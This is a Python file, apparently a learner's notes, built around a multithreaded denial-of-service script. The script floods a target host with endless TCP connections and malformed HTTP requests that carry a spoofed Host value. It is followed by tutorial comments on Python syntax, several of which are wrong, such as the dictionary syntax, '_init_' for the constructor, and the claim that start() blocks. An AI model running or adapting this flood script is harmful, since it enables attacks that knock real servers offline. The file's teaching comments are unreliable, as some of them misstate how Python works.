import threading                 # imported modules for outside functions/objects, can use pip on CLI to access more
import socket

# globals

target = 'ip address'
port = 80                         # don't need a type or mutability or anything. Python infers typing etc dynamically from context (part of why it's "slow")
fake_ip = '182.21.20.32'
range_num = 500

already_connected = 0

# Creates an infinite loop of HTTP GET requests to overload a system

def attack():     # functions are declared with "def", parameters go between ()
    while True:   # booleans have Capital letters for some reason
                  # notice function/control blocks use : and indentation instaed of {}

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # returns an object representation of an IPv4/TCP socket 
                                                                # (AF_INET = IPv4, SOCK_STREAM = TCP)
        s.connect((target, port))                               # binds the socket object in python to a tcp/ip socket on the target
        s.sendto(("Get /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))  # creates an HTTP request for DDoS
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target,port))      # fake return address to think I'm hiding my identity (i'm not)
        s.close()                                               #closes connection

        global already_connected     # "global" gives access outside of scope
        already_connected += 1
        if already_connected % 500 == 0: # prints every 500th connection to console (the more prints the slower it executes due 
                                         # the required system calls)
            print(already_connected)

# Like a scripting language you don't "need" a main method, you just define functions then commands that you want to execute.

for i in range(range_num): # A "range" is python data type that lets you iterate through the given number set, in this case creating threads for ddos
    thread = threading.Thread(target=attack) # creates a new thread that executes the attack function
    thread.start()         # starts the new thread execution (you'd use join to allow it to close, start() does block the main execution of the thread if that matters)

# not THAT important, but the python interpreter has a lock/mutex that doesn't support "real" multithreading 
# but the threading library just context switches really fast to the point where it's not a super important distinction in most cases

# random stuff:

# comments use #
# indentation is really important and defines scope in most cases
# there are no true arrays, but there are lists that are basically arrays. Don't look at me I didn't design the language

# to define an object just use object_demo = { key1: value1, key2 = value2}
#   - reference fields and methods using dot notation, so using "object_demo.key1" would give value1.
# you can define Classes for objects like you would in other OOP languages

# class ExampleClass:
#   def _init_(parameters for construction):   <-- the _init_ is the "constructor"
#       self.field_name = value
#       self.field_name = value
#
#   def method(parameter):
#       <code>

# then you can instantiate a object of this class like
#   variable_name = ExampleClass(parameter, parameter)
#   and use any of the defined methods like variable_name.method(parameters)